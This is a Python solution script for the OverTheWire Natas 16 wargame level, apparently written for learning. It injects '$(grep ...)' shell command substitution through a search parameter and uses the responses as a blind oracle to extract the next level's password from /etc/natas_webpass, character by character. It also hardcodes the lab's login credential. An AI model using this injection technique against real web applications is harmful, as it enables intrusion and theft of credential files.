#!/usr/bin/python

import requests
import string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"

characters = string.ascii_letters + string.digits

# print(characters)

default_needle = "Africans"

password_chars = ""

iter = 1

print("chars = ", end="")

for i in characters:
    r = requests.get(
        url,
        auth=(auth_username, auth_password),
        params={
            "needle": default_needle + "$(grep " + i + " /etc/natas_webpass/natas17)"
        },
    )
    # print(r.text)
    if default_needle not in r.text:
        password_chars += i
        print(i, end="", flush=True)

print()

print("password chars = ", password_chars)
password = ""

while True:
    for i in password_chars:
        r = requests.get(
            url,
            auth=(auth_username, auth_password),
            params={
                "needle": default_needle
                + "$(grep ^"
                + password
                + i
                + " /etc/natas_webpass/natas17)"
            },
        )
        if default_needle not in r.text:
            password += i
            print(password)
